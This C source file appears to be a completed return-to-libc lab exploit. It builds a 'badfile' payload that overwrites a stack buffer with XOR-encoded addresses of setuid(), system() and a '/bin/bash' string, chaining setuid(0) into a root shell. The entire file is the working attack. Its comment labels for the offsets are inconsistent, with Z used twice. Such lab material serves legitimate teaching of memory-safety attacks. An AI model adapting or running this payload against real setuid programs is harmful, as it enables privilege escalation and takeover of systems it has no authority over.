/* exploit_2.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
    char buf[52];
    FILE *badfile;
    memset(buf, 1, sizeof(buf));   
    badfile = fopen("./badfile", "w");
    /* You need to decide the addresses and
    the values for X, Y, Z. The order of the following
    statements does not imply the order of X, Y, Z.
    Actually, we intentionally scrambled the order. */
	// Y = 24
	// setuid() address = 0xb7ecba90 xor 0xbebebebe = 0x952042e
    *(long *) &buf[24] = 0x952042e;
	// W = 28
	// system() addresss = system() address = 0xb7e55310 xor 0xbebebebe = 0x95bedae
    *(long *) &buf[28] = 0x95bedae;
	// Z = 32
	// parameter for setuid = 0 xor 0xbebebebe = 0xbebebebe
    *(long *) &buf[32] = 0xbebebebe;
	// Z =36
	// "/bin/bash" address = //0xbffffdf6 xor 0xbebebebe = 0x1414348
    *(long *) &buf[36] = 0x1414348;
    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
}
